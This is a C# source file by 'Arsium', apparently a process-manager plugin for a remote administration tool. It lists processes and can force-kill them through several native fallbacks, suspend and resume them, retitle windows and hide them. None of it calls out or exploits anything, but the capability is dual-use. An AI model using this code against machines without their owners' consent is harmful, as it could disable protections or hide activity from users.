using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
	internal class Functions
	{
		internal static void GetProcesses(ref Data data)
		{
			try
			{
				List<object[]> Proc = new List<object[]>();

				Process[] ListProc = Process.GetProcesses();

				foreach (Process P in ListProc)
				{

					try
					{
						if (File.Exists(P.MainModule.FileName))
						{
							List<object> P_details = new List<object>();

							System.Drawing.Icon i = System.Drawing.Icon.ExtractAssociatedIcon(P.MainModule.FileName);

							MemoryStream stream = new MemoryStream();

							Bitmap azo = i.ToBitmap();

							azo.Save(stream, ImageFormat.Png);

							P_details.Add(P.ProcessName);

							try
							{
								P_details.Add(P.Id);
							}
							catch (Exception)
							{
								P_details.Add("Cannot get PID");
							}

							P_details.Add(P.MainWindowTitle);

							P_details.Add(P.MainWindowHandle.ToString());

							P_details.Add(stream.ToArray());

							Proc.Add(P_details.ToArray());
						}

					}
					catch (Exception)
					{
						List<object> P_details = new List<object>();
						P_details.Add(P.ProcessName);
						try
						{
							P_details.Add(P.Id);
							P_details.Add(P.MainWindowTitle);
							P_details.Add(P.MainWindowHandle.ToString());
						}
						catch (Exception)
						{
							P_details.Add("Cannot get PID");
							P_details.Add(P.MainWindowTitle);
							P_details.Add(P.MainWindowHandle.ToString());
						}
						Proc.Add(P_details.ToArray());
					}

				}
				data.DataReturn = Proc;
				data.returnError = new ReturnError() { hasError = false };
			}
			catch (System.Exception ex)
			{
				data.returnError = new ReturnError() { hasError = true, errorDescription = ex.ToString() };
			}

		}
		internal static bool KillProcess(int PID)
		{
			uint ntstatus;
			try
			{
				bool b = NativeAPI.Process.TerminateProcess(Process.GetProcessById(PID).Handle, 0);
				if (b == true)
					return true;
			}
			catch (Exception)
			{

			}
			try
			{
				ntstatus = NativeAPI.Process.ZwTerminateProcess(Process.GetProcessById(PID).Handle, 0);
				if (ntstatus == 0)
					return true;
			}
			catch (Exception)
			{

			}
			try
			{
				ntstatus = NativeAPI.Process.NtTerminateProcess(Process.GetProcessById(PID).Handle, 0);
				if (ntstatus == 0)
					return true;

			}
			catch (Exception)
			{

			}
			try
			{
				IntPtr result = NativeAPI.Miscellaneous.SendMessage(Process.GetProcessById(PID).MainWindowHandle, NativeAPI.Miscellaneous.WM_Message.WM_SYSCOMMAND, NativeAPI.Miscellaneous.SC_Message.SC_CLOSE, IntPtr.Zero);
				if (result == IntPtr.Zero)
					return true;
			}
			catch (Exception)
			{

			}
            try
            {
				bool res = NativeAPI.Process.EndTask(Process.GetProcessById(PID).MainWindowHandle, false, true);
				if (res == true)
					return true;
			}
            catch (Exception)
            {

            }
			return false;
		}
		internal static bool SuspendProcess(int PID)
		{
			uint ntstatus;
			try
			{
				ntstatus = NativeAPI.Process.ZwSuspendProcess(Process.GetProcessById(PID).Handle);
				if (ntstatus == 0)
					return true;
			}
			catch (Exception)
			{
			}
			try
			{
				ntstatus = NativeAPI.Process.NtSuspendProcess(Process.GetProcessById(PID).Handle);
				if (ntstatus == 0)
					return true;
			}
			catch (Exception)
			{

			}
			return false;
		}
		internal static bool ResumeProcess(int PID)
		{
			uint ntstatus;
			try
			{
				ntstatus = NativeAPI.Process.NtResumeProcess(Process.GetProcessById(PID).Handle);
				if (ntstatus == 0)
					return true;
			}
			catch (Exception)
			{
			}
			try
			{
				ntstatus = NativeAPI.Process.ZwResumeProcess(Process.GetProcessById(PID).Handle);
				if (ntstatus == 0)
					return true;
			}
			catch (Exception)
			{

			}
			return false;
		}
		internal static bool SetWindowsText(int PID, string Text)
		{
			IntPtr M = NativeAPI.Miscellaneous.SendMessage(Process.GetProcessById(PID).MainWindowHandle, NativeAPI.Miscellaneous.WM_Message.WM_SETTEXT, NativeAPI.Miscellaneous.SC_Message.NONE, Text);
			if (M == (IntPtr)1)
				return true;

			return false;
		}
		internal static void MinimizeWindow(int PID) 
		{
			IntPtr result = NativeAPI.Miscellaneous.SendMessage(Process.GetProcessById(PID).MainWindowHandle, NativeAPI.Miscellaneous.WM_Message.WM_SYSCOMMAND, NativeAPI.Miscellaneous.SC_Message.SC_MINIMIZE, IntPtr.Zero);

		}
		internal static void MaximizeWindow(int PID)
		{
			IntPtr result = NativeAPI.Miscellaneous.SendMessage(Process.GetProcessById(PID).MainWindowHandle, NativeAPI.Miscellaneous.WM_Message.WM_SYSCOMMAND, NativeAPI.Miscellaneous.SC_Message.SC_MAXIMIZE, IntPtr.Zero);
		}
		internal static void HideWindow(IntPtr WindowHandle)
		{
			NativeAPI.Miscellaneous.ShowWindow(WindowHandle, 0);
		}
		internal static void ShowWindow(IntPtr WindowHandle)
		{
			NativeAPI.Miscellaneous.ShowWindow(WindowHandle, 5);
		}
	}
}
